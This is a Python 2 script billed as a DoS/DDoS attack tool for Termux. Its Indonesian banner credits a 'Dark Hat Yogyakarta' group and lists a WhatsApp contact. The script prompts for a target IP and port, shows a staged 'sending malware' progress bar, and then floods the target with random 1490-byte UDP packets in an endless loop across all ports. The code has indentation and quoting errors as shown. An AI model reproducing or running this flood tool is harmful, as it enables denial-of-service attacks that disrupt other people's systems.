import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet ATTACK TOOLS DOS")
print
    print "-------------------PROFIL CREATOR SCRIPT TERMUX DDOS--------------------"
    print "NAMA KETUA KELOMPOK : VANNEZZ × JAVA 
    print "NOMOR WHATSAPP      : +6285171197674 / REPUBLIK INDONESIA'
    print "ORGANISASI          : DARK HAT YOGYAKARTA"
    print "------------TEAM SECURITY REPUBLIK INDONESIA NEGARA PANCASILA------------"
print
ip = raw_input("IP / HOST TARGET ? : ")
port = input("PORT NYA ?     : ")

os.system("clear")
os.system("figlet Mengirim Malware")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Mengirim %s Bug Bot HW %s Ke Port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
